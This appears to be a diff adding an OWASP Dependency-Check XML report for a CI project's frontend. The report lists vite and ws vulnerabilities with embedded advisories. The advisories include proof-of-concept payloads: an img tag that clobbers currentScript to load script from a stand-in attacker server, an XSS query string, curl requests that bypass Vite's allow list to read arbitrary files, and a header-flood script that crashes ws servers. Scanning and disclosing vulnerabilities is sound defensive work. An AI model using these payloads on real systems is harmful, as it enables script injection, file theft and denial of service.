+import extraURL from &apos;./extra.js?url&apos;
+var s = document.createElement(&apos;script&apos;)
+s.src = extraURL
+document.head.append(s)
+```
+
+```
+// extra.js
+export default &quot;https://myserver/justAnOther.js&quot;
+```
+
+```
+// vite.config.js
+import { defineConfig } from &apos;vite&apos;
+
+export default defineConfig({
+  build: {
+    assetsInlineLimit: 0, // To avoid inline assets for PoC
+    rollupOptions: {
+      output: {
+        format: &quot;cjs&quot;
+      },
+    },
+  },
+  base: &quot;./&quot;,
+});
+```
+
+After running the build command, the developer will get following bundle as the output.
+
+```
+// dist/index-DDmIg9VD.js
+&quot;use strict&quot;;const t=&quot;&quot;+(typeof document&gt;&quot;u&quot;?require(&quot;url&quot;).pathToFileURL(__dirname+&quot;/extra-BLVEx9Lb.js&quot;).href:new URL(&quot;extra-BLVEx9Lb.js&quot;,document.currentScript&amp;&amp;document.currentScript.src||document.baseURI).href);var e=document.createElement(&quot;script&quot;);e.src=t;document.head.append(e);
+```
+
+Adding the Vite bundled script, `dist/index-DDmIg9VD.js`, as part of the web page source code, the page could load the `extra.js` file from the attacker&apos;s domain, `attacker.controlled.server`. The attacker only needs to insert an `img` tag with the `name` attribute set to `currentScript`. This can be done through a website&apos;s feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.
+
+
+```
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+  &lt;title&gt;Vite Example&lt;/title&gt;
+  &lt;!-- Attacker-controlled Script-less HTML Element starts--!&gt;
+  &lt;img name=&quot;currentScript&quot; src=&quot;https://attacker.controlled.server/&quot;&gt;&lt;/img&gt;
+  &lt;!-- Attacker-controlled Script-less HTML Element ends--!&gt;
+&lt;/head&gt;
+&lt;script type=&quot;module&quot; crossorigin src=&quot;/assets/index-DDmIg9VD.js&quot;&gt;&lt;/script&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+```
+
+### Impact
+
+This vulnerability can result in cross-site scripting (XSS) attacks on websites that include Vite-bundled files (configured with an output format of `cjs`, `iife`, or `umd`) and allow users to inject certain scriptless HTML tags without properly sanitizing the name or id attributes.
+
+### Patch
+
+```
+// https://github.com/vitejs/vite/blob/main/packages/vite/src/node/build.ts#L1296
+const getRelativeUrlFromDocument = (relativePath: string, umd = false) =&gt;
+  getResolveUrl(
+    `&apos;${escapeId(partialEncodeURIPath(relativePath))}&apos;, ${
+      umd ? `typeof document === &apos;undefined&apos; ? location.href : ` : &apos;&apos;
+    }document.currentScript &amp;&amp; document.currentScript.tagName.toUpperCase() === &apos;SCRIPT&apos; &amp;&amp; document.currentScript.src || document.baseURI`,
+  )
+```</description><references><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e</url><name>https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-64vr-g452-qvp3</url><name>https://github.com/advisories/GHSA-64vr-g452-qvp3</name></reference><reference><source>NPM Advisory reference: </source><url>https://scnps.co/papers/sp23_domclob.pdf</url><name>https://scnps.co/papers/sp23_domclob.pdf</name></reference><reference><source>NPM Advisory reference: </source><url>https://nvd.nist.gov/vuln/detail/CVE-2024-45812</url><name>https://nvd.nist.gov/vuln/detail/CVE-2024-45812</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af</url><name>https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</url><name>https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</name></reference><reference><source>NPM Advisory reference: </source><url>https://research.securitum.com/xss-in-amp4email-dom-clobbering</url><name>https://research.securitum.com/xss-in-amp4email-dom-clobbering</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3</url><name>https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd</url><name>https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/ade1d89660e17eedfd35652165b0c26905259fad</url><name>https://github.com/vitejs/vite/commit/ade1d89660e17eedfd35652165b0c26905259fad</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675</url><name>https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3</url><name>https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:vite:\&gt;\=4.0.0\&lt;4.5.4:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="OSSINDEX"><name>CVE-2023-49293</name><severity>MEDIUM</severity><cvssV3><baseScore>6.099999904632568</baseScore><attackVector>NETWORK</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>REQUIRED</userInteraction><scope>CHANGED</scope><confidentialityImpact>LOW</confidentialityImpact><integrityImpact>LOW</integrityImpact><availabilityImpact>NONE</availabilityImpact><baseSeverity>MEDIUM</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-79</cwe></cwes><description>Vite is a website frontend framework. When Vite&apos;s HTML transformation is invoked manually via `server.transformIndexHtml`, the original request URL is passed in unmodified, and the `html` being transformed contains inline module scripts (`&lt;script type=&quot;module&quot;&gt;...&lt;/script&gt;`), it is possible to inject arbitrary HTML into the transformed output by supplying a malicious URL query string to `server.transformIndexHtml`. Only apps using `appType: &apos;custom&apos;` and using the default Vite HTML middleware are affected. The HTML entry must also contain an inline script. The attack requires a user to click on a malicious URL while running the dev server. Restricted files aren&apos;t exposed to the attacker. This issue has been addressed in vite@5.0.5, vite@4.5.1, and vite@4.4.12. There are no known workarounds for this vulnerability.</description><references><reference><source>OSSINDEX</source><url>https://ossindex.sonatype.org/vulnerability/CVE-2023-49293?component-type=npm&amp;component-name=vite&amp;utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=10.0.4</url><name>[CVE-2023-49293] CWE-79: Improper Neutralization of Input During Web Page Generation (&apos;Cross-site Scripting&apos;)</name></reference><reference><source>OSSIndex</source><url>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2023-49293</url><name>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2023-49293</name></reference><reference><source>OSSIndex</source><url>https://github.com/vitejs/vite/security/advisories/GHSA-92r3-m2mg-pj97</url><name>https://github.com/vitejs/vite/security/advisories/GHSA-92r3-m2mg-pj97</name></reference></references><vulnerableSoftware><software vulnerabilityIdMatched="true">cpe:2.3:a:*:vite:4.5.0:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="NPM"><name>GHSA-92r3-m2mg-pj97</name><severity unscored="true">moderate</severity><cvssV3><baseScore>6.099999904632568</baseScore><attackVector>NETWORK</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>REQUIRED</userInteraction><scope>CHANGED</scope><confidentialityImpact>LOW</confidentialityImpact><integrityImpact>LOW</integrityImpact><availabilityImpact>NONE</availabilityImpact><baseSeverity>MEDIUM</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-79</cwe></cwes><description>### Summary
+When Vite&apos;s HTML transformation is invoked manually via `server.transformIndexHtml`, the original request URL is passed in unmodified, and the `html` being transformed contains inline module scripts (`&lt;script type=&quot;module&quot;&gt;...&lt;/script&gt;`), it is possible to inject arbitrary HTML into the transformed output by supplying a malicious URL query string to `server.transformIndexHtml`.
+
+### Impact
+Only apps using `appType: &apos;custom&apos;` and using the default Vite HTML middleware are affected. The HTML entry must also contain an inline script. The attack requires a user to click on a malicious URL while running the dev server. Restricted files aren&apos;t exposed to the attacker.
+
+### Patches
+Fixed in vite@5.0.5, vite@4.5.1, vite@4.4.12
+
+### Details
+Suppose `index.html` contains an inline module script:
+
+```html
+&lt;script type=&quot;module&quot;&gt;
+  // Inline script
+&lt;/script&gt;
+```
+
+This script is transformed into a proxy script like
+
+```html
+&lt;script type=&quot;module&quot; src=&quot;/index.html?html-proxy&amp;index=0.js&quot;&gt;&lt;/script&gt;
+```
+
+due to Vite&apos;s HTML plugin:
+
+https://github.com/vitejs/vite/blob/7fd7c6cebfcad34ae7021ebee28f97b1f28ef3f3/packages/vite/src/node/plugins/html.ts#L429-L465
+
+When `appType: &apos;spa&apos; | &apos;mpa&apos;`, Vite serves HTML itself, and `htmlFallbackMiddleware` rewrites `req.url` to the canonical path of `index.html`,
+
+https://github.com/vitejs/vite/blob/73ef074b80fa7252e0c46a37a2c94ba8cba46504/packages/vite/src/node/server/middlewares/htmlFallback.ts#L44-L47
+
+so the `url` passed to `server.transformIndexHtml` is `/index.html`.
+
+However, if `appType: &apos;custom&apos;`, HTML is served manually, and if `server.transformIndexHtml` is called with the unmodified request URL (as the SSR docs suggest), then the path of the transformed `html-proxy` script varies with the request URL. For example, a request with path `/` produces
+
+```html
+&lt;script type=&quot;module&quot; src=&quot;/@id/__x00__/index.html?html-proxy&amp;index=0.js&quot;&gt;&lt;/script&gt;
+```
+
+It is possible to abuse this behavior by crafting a request URL to contain a malicious payload like
+
+```
+&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(&apos;boom&apos;)&lt;/script&gt;
+```
+
+so a request to http://localhost:5173/?%22%3E%3C/script%3E%3Cscript%3Ealert(%27boom%27)%3C/script%3E produces HTML output like
+
+```html
+&lt;script type=&quot;module&quot; src=&quot;/@id/__x00__/?&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(&quot;boom&quot;)&lt;/script&gt;?html-proxy&amp;index=0.js&quot;&gt;&lt;/script&gt;
+```
+
+which demonstrates XSS.
+
+### PoC
+
+- Example 1. Serving HTML from `vite dev` middleware with `appType: &apos;custom&apos;`
+    - Go to https://stackblitz.com/edit/vitejs-vite-9xhma4?file=main.js&amp;terminal=dev-html
+    - &quot;Open in New Tab&quot;
+    - Edit URL to set query string to `?%22%3E%3C/script%3E%3Cscript%3Ealert(%27boom%27)%3C/script%3E` and navigate
+    - Witness XSS:
+    - ![image](https://user-images.githubusercontent.com/2456381/287434281-13757894-7a63-4a73-b1e9-d2b024c19d14.png)
+- Example 2. Serving HTML from SSR-style Express server (Vite dev server runs in middleware mode):
+    - Go to https://stackblitz.com/edit/vitejs-vite-9xhma4?file=main.js&amp;terminal=server
+    - (Same steps as above)
+- Example 3. Plain `vite dev` (this shows that vanilla `vite dev` is _not_ vulnerable, provided `htmlFallbackMiddleware` is used)
+    - Go to https://stackblitz.com/edit/vitejs-vite-9xhma4?file=main.js&amp;terminal=dev
+    - (Same steps as above)
+    - You should _not_ see the alert box in this case
+
+### Detailed Impact
+
+This will probably predominantly affect [development-mode SSR](https://vitejs.dev/guide/ssr#setting-up-the-dev-server), where `vite.transformHtml` is called using the original `req.url`, per the docs:
+
+https://github.com/vitejs/vite/blob/7fd7c6cebfcad34ae7021ebee28f97b1f28ef3f3/docs/guide/ssr.md?plain=1#L114-L126
+
+However, since this vulnerability affects `server.transformIndexHtml`, the scope of impact may be higher to also include other ad-hoc calls to `server.transformIndexHtml` from outside of Vite&apos;s own codebase.
+
+My best guess at bisecting which versions are vulnerable involves the following test script
+
+```js
+import fs from &apos;node:fs/promises&apos;;
+import * as vite from &apos;vite&apos;;
+
+const html = `
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+  &lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot; /&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;script type=&quot;module&quot;&gt;
+      // Inline script
+    &lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+`;
+const server = await vite.createServer({ appType: &apos;custom&apos; });
+const transformed = await server.transformIndexHtml(&apos;/?%22%3E%3C/script%3E%3Cscript%3Ealert(%27boom%27)%3C/script%3E&apos;, html);
+console.log(transformed);
+await server.close();
+```
+
+and using it I was able to narrow down to #13581. If this is correct, then vulnerable Vite versions are 4.4.0-beta.2 and higher (which includes 4.4.0).</description><references><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-92r3-m2mg-pj97</url><name>https://github.com/advisories/GHSA-92r3-m2mg-pj97</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/security/advisories/GHSA-92r3-m2mg-pj97</url><name>https://github.com/vitejs/vite/security/advisories/GHSA-92r3-m2mg-pj97</name></reference><reference><source>NPM Advisory reference: </source><url>https://nvd.nist.gov/vuln/detail/CVE-2023-49293</url><name>https://nvd.nist.gov/vuln/detail/CVE-2023-49293</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:vite:\=4.5.0:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="OSSINDEX"><name>CVE-2024-31207</name><severity>MEDIUM</severity><cvssV3><baseScore>5.900000095367432</baseScore><attackVector>NETWORK</attackVector><attackComplexity>HIGH</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>NONE</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>HIGH</confidentialityImpact><integrityImpact>NONE</integrityImpact><availabilityImpact>NONE</availabilityImpact><baseSeverity>MEDIUM</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-200</cwe></cwes><description>Vite (French word for &quot;quick&quot;, pronounced /vit/, like &quot;veet&quot;) is a frontend build tooling to improve the frontend development experience.`server.fs.deny` does not deny requests for patterns with directories. This vulnerability has been patched in version(s) 5.2.6, 5.1.7, 5.0.13, 4.5.3, 3.2.10 and 2.9.18.</description><references><reference><source>OSSINDEX</source><url>https://ossindex.sonatype.org/vulnerability/CVE-2024-31207?component-type=npm&amp;component-name=vite&amp;utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=10.0.4</url><name>[CVE-2024-31207] CWE-200: Information Exposure</name></reference><reference><source>OSSIndex</source><url>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-31207</url><name>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-31207</name></reference><reference><source>OSSIndex</source><url>https://github.com/advisories/GHSA-8jhw-289h-jh2g</url><name>https://github.com/advisories/GHSA-8jhw-289h-jh2g</name></reference></references><vulnerableSoftware><software vulnerabilityIdMatched="true">cpe:2.3:a:*:vite:4.5.0:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="NPM"><name>GHSA-8jhw-289h-jh2g</name><severity unscored="true">moderate</severity><cvssV3><baseScore>5.900000095367432</baseScore><attackVector>NETWORK</attackVector><attackComplexity>HIGH</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>NONE</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>HIGH</confidentialityImpact><integrityImpact>NONE</integrityImpact><availabilityImpact>NONE</availabilityImpact><baseSeverity>MEDIUM</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-284</cwe><cwe>CWE-200</cwe></cwes><description>### Summary
+[Vite dev server option](https://vitejs.dev/config/server-options.html#server-fs-deny) `server.fs.deny` did not deny requests for patterns with directories. An example of such a pattern is `/foo/**/*`.
+
+### Impact
+Only apps setting a custom `server.fs.deny` that includes a pattern with directories, and explicitly exposing the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.
+
+### Patches
+Fixed in vite@5.2.6, vite@5.1.7, vite@5.0.13, vite@4.5.3, vite@3.2.10, vite@2.9.18
+
+### Details
+`server.fs.deny` uses picomatch with the config of `{ matchBase: true }`. [matchBase](https://github.com/micromatch/picomatch/blob/master/README.md#options:~:text=Description-,basename,-boolean) only matches the basename of the file, not the path due to a bug (https://github.com/micromatch/picomatch/issues/89). The vite config docs read like you should be able to set fs.deny to glob with picomatch. Vite also does not set `{ dot: true }` and that causes [dotfiles not to be denied](https://github.com/micromatch/picomatch/blob/master/README.md#options:~:text=error%20is%20thrown.-,dot,-boolean) unless they are explicitly defined.
+
+**Reproduction**
+
+Set fs.deny to `[&apos;**/.git/**&apos;]` and then curl for `/.git/config`.
+
+* with `matchBase: true`, you can get any file under  `.git/` (config, HEAD, etc).
+* with `matchBase: false`, you cannot get any file under  `.git/` (config, HEAD, etc).
+</description><references><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/security/advisories/GHSA-8jhw-289h-jh2g</url><name>https://github.com/vitejs/vite/security/advisories/GHSA-8jhw-289h-jh2g</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/89c7c645f09d16a38f146ef4a1528f218e844d67</url><name>https://github.com/vitejs/vite/commit/89c7c645f09d16a38f146ef4a1528f218e844d67</name></reference><reference><source>NPM Advisory reference: </source><url>https://nvd.nist.gov/vuln/detail/CVE-2024-31207</url><name>https://nvd.nist.gov/vuln/detail/CVE-2024-31207</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/011bbca350e447d1b499d242804ce62738c12bc0</url><name>https://github.com/vitejs/vite/commit/011bbca350e447d1b499d242804ce62738c12bc0</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/d2db33f7d4b96750b35370c70dd2c35ec3b9b649</url><name>https://github.com/vitejs/vite/commit/d2db33f7d4b96750b35370c70dd2c35ec3b9b649</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-8jhw-289h-jh2g</url><name>https://github.com/advisories/GHSA-8jhw-289h-jh2g</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/ba5269cca81de3f5fbb0f49d58a1c55688043258</url><name>https://github.com/vitejs/vite/commit/ba5269cca81de3f5fbb0f49d58a1c55688043258</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/96a7f3a41ef2f9351c46f3ab12489bb4efa03cc9</url><name>https://github.com/vitejs/vite/commit/96a7f3a41ef2f9351c46f3ab12489bb4efa03cc9</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/5a056dd2fc80dbafed033062fe6aaf4717309f48</url><name>https://github.com/vitejs/vite/commit/5a056dd2fc80dbafed033062fe6aaf4717309f48</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:vite:\&gt;\=4.0.0\&lt;\=4.5.2:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="NPM"><name>GHSA-9cwx-2883-4wfx</name><severity unscored="true">moderate</severity><cvssV3><baseScore>5.300000190734863</baseScore><attackVector>NETWORK</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>NONE</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>LOW</confidentialityImpact><integrityImpact>NONE</integrityImpact><availabilityImpact>NONE</availabilityImpact><baseSeverity>MEDIUM</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-284</cwe><cwe>CWE-200</cwe></cwes><description>### Summary
+The contents of arbitrary files can be returned to the browser.
+
+### Details
+`@fs` denies access to files outside of Vite serving allow list. Adding `?import&amp;raw` to the URL bypasses this limitation and returns the file content if it exists.
+
+### PoC
+```sh
+$ npm create vite@latest
+$ cd vite-project/
+$ npm install
+$ npm run dev
+
+$ echo &quot;top secret content&quot; &gt; /tmp/secret.txt
+
+# expected behaviour
+$ curl &quot;http://localhost:5173/@fs/tmp/secret.txt&quot;
+
+    &lt;body&gt;
+      &lt;h1&gt;403 Restricted&lt;/h1&gt;
+      &lt;p&gt;The request url &amp;quot;/tmp/secret.txt&amp;quot; is outside of Vite serving allow list.
+
+# security bypassed
+$ curl &quot;http://localhost:5173/@fs/tmp/secret.txt?import&amp;raw&quot;
+export default &quot;top secret content\n&quot;
+//# sourceMappingURL=data:application/json;base64,eyJ2...
+```
+
+</description><references><reference><source>NPM Advisory reference: </source><url>https://nvd.nist.gov/vuln/detail/CVE-2024-45811</url><name>https://nvd.nist.gov/vuln/detail/CVE-2024-45811</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/6820bb3b9a54334f3268fc5ee1e967d2e1c0db34</url><name>https://github.com/vitejs/vite/commit/6820bb3b9a54334f3268fc5ee1e967d2e1c0db34</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/security/advisories/GHSA-9cwx-2883-4wfx</url><name>https://github.com/vitejs/vite/security/advisories/GHSA-9cwx-2883-4wfx</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/8339d7408668686bae56eaccbfdc7b87612904bd</url><name>https://github.com/vitejs/vite/commit/8339d7408668686bae56eaccbfdc7b87612904bd</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/4573a6fd6f1b097fb7296a3e135e0646b996b249</url><name>https://github.com/vitejs/vite/commit/4573a6fd6f1b097fb7296a3e135e0646b996b249</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/b901438f99e667f76662840826eec91c8ab3b3e7</url><name>https://github.com/vitejs/vite/commit/b901438f99e667f76662840826eec91c8ab3b3e7</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/a6da45082b6e73ddfdcdcc06bb5414f976a388d6</url><name>https://github.com/vitejs/vite/commit/a6da45082b6e73ddfdcdcc06bb5414f976a388d6</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-9cwx-2883-4wfx</url><name>https://github.com/advisories/GHSA-9cwx-2883-4wfx</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:vite:\&gt;\=4.0.0\&lt;\=4.5.3:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="OSSINDEX"><name>CVE-2024-45811</name><severity>MEDIUM</severity><cvssV3><baseScore>4.800000190734863</baseScore><attackVector>ADJACENT_NETWORK</attackVector><attackComplexity>HIGH</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>REQUIRED</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>HIGH</confidentialityImpact><integrityImpact>NONE</integrityImpact><availabilityImpact>NONE</availabilityImpact><baseSeverity>MEDIUM</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-200</cwe></cwes><description>Vite a frontend build tooling framework for javascript. In affected versions the contents of arbitrary files can be returned to the browser. `@fs` denies access to files outside of Vite serving allow list. Adding `?import&amp;raw` to the URL bypasses this limitation and returns the file content if it exists. This issue has been patched in versions 5.4.6, 5.3.6, 5.2.14, 4.5.5, and 3.2.11. Users are advised to upgrade. There are no known workarounds for this vulnerability.
+
+Sonatype&apos;s research suggests that this CVE&apos;s details differ from those defined at NVD. See https://ossindex.sonatype.org/vulnerability/CVE-2024-45811 for details</description><references><reference><source>OSSINDEX</source><url>https://ossindex.sonatype.org/vulnerability/CVE-2024-45811?component-type=npm&amp;component-name=vite&amp;utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=10.0.4</url><name>[CVE-2024-45811] CWE-200: Information Exposure</name></reference><reference><source>OSSIndex</source><url>https://github.com/advisories/GHSA-9cwx-2883-4wfx</url><name>https://github.com/advisories/GHSA-9cwx-2883-4wfx</name></reference><reference><source>OSSIndex</source><url>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-45811</url><name>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-45811</name></reference></references><vulnerableSoftware><software vulnerabilityIdMatched="true">cpe:2.3:a:*:vite:4.5.0:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability></vulnerabilities></dependency><dependency isVirtual="true"><fileName>ws:8.15.1</fileName><filePath>/var/lib/jenkins/workspace/Wanderlust-CI/frontend/package-lock.json?ws</filePath><md5></md5><sha1></sha1><sha256></sha256><projectReferences><projectReference>package-lock.json: transitive</projectReference></projectReferences><evidenceCollected><evidence type="vendor" confidence="HIGH"><source>package.json</source><name>name</name><value>ws</value></evidence><evidence type="product" confidence="HIGHEST"><source>package.json</source><name>name</name><value>ws</value></evidence><evidence type="version" confidence="HIGHEST"><source>package.json</source><name>version</name><value>8.15.1</value></evidence></evidenceCollected><identifiers><package confidence="HIGHEST"><id>pkg:npm/ws@8.15.1</id><url>https://ossindex.sonatype.org/component/pkg:npm/ws@8.15.1?utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=10.0.4</url></package></identifiers><vulnerabilities><vulnerability source="OSSINDEX"><name>CVE-2024-37890</name><severity>HIGH</severity><cvssV3><baseScore>7.5</baseScore><attackVector>NETWORK</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>NONE</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>NONE</confidentialityImpact><integrityImpact>NONE</integrityImpact><availabilityImpact>HIGH</availabilityImpact><baseSeverity>HIGH</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-476</cwe></cwes><description>ws is an open source WebSocket client and server for Node.js. A request with a number of headers exceeding theserver.maxHeadersCount threshold could be used to crash a ws server. The vulnerability was fixed in ws@8.17.1 (e55e510) and backported to ws@7.5.10 (22c2876), ws@6.2.3 (eeb76d3), and ws@5.2.4 (4abd8f6). In vulnerable versions of ws, the issue can be mitigated in the following ways: 1. Reduce the maximum allowed length of the request headers using the --max-http-header-size=size and/or the maxHeaderSize options so that no more headers than the server.maxHeadersCount limit can be sent. 2. Set server.maxHeadersCount to 0 so that no limit is applied.</description><references><reference><source>OSSIndex</source><url>https://github.com/websockets/ws/security/advisories/GHSA-3h5v-q93c-6h6q</url><name>https://github.com/websockets/ws/security/advisories/GHSA-3h5v-q93c-6h6q</name></reference><reference><source>OSSINDEX</source><url>https://ossindex.sonatype.org/vulnerability/CVE-2024-37890?component-type=npm&amp;component-name=ws&amp;utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=10.0.4</url><name>[CVE-2024-37890] CWE-476: NULL Pointer Dereference</name></reference><reference><source>OSSIndex</source><url>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-37890</url><name>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-37890</name></reference></references><vulnerableSoftware><software vulnerabilityIdMatched="true">cpe:2.3:a:*:ws:8.15.1:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="NPM"><name>GHSA-3h5v-q93c-6h6q</name><severity unscored="true">high</severity><cvssV3><baseScore>7.5</baseScore><attackVector>NETWORK</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>NONE</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>NONE</confidentialityImpact><integrityImpact>NONE</integrityImpact><availabilityImpact>HIGH</availabilityImpact><baseSeverity>HIGH</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-476</cwe></cwes><description>### Impact
+
+A request with a number of headers exceeding the[`server.maxHeadersCount`][] threshold could be used to crash a ws server.
+
+### Proof of concept
+
+```js
+const http = require(&apos;http&apos;);
+const WebSocket = require(&apos;ws&apos;);
+
+const wss = new WebSocket.Server({ port: 0 }, function () {
+  const chars = &quot;!#$%&amp;&apos;*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~&quot;.split(&apos;&apos;);
+  const headers = {};
+  let count = 0;
+
+  for (let i = 0; i &lt; chars.length; i++) {
+    if (count === 2000) break;
+
+    for (let j = 0; j &lt; chars.length; j++) {
+      const key = chars[i] + chars[j];
+      headers[key] = &apos;x&apos;;
+
+      if (++count === 2000) break;
+    }
+  }
+
+  headers.Connection = &apos;Upgrade&apos;;
+  headers.Upgrade = &apos;websocket&apos;;
+  headers[&apos;Sec-WebSocket-Key&apos;] = &apos;dGhlIHNhbXBsZSBub25jZQ==&apos;;
+  headers[&apos;Sec-WebSocket-Version&apos;] = &apos;13&apos;;
+
+  const request = http.request({
+    headers: headers,
+    host: &apos;127.0.0.1&apos;,
+    port: wss.address().port
+  });
+
+  request.end();
+});
+```
+
+### Patches
+
+The vulnerability was fixed in ws@8.17.1 (https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c) and backported to ws@7.5.10 (https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f), ws@6.2.3 (https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63), and ws@5.2.4 (https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e)
+
+### Workarounds
+
+In vulnerable versions of ws, the issue can be mitigated in the following ways:
+
+1. Reduce the maximum allowed length of the request headers using the [`--max-http-header-size=size`][] and/or the [`maxHeaderSize`][] options so that no more headers than the `server.maxHeadersCount` limit can be sent.
+2. Set `server.maxHeadersCount` to `0` so that no limit is applied.
+
+### Credits
+
+The vulnerability was reported by [Ryan LaPointe](https://github.com/rrlapointe) in https://github.com/websockets/ws/issues/2230.
+
+### References
+
+- https://github.com/websockets/ws/issues/2230
+- https://github.com/websockets/ws/pull/2231
+
+[`--max-http-header-size=size`]: https://nodejs.org/api/cli.html#--max-http-header-sizesize
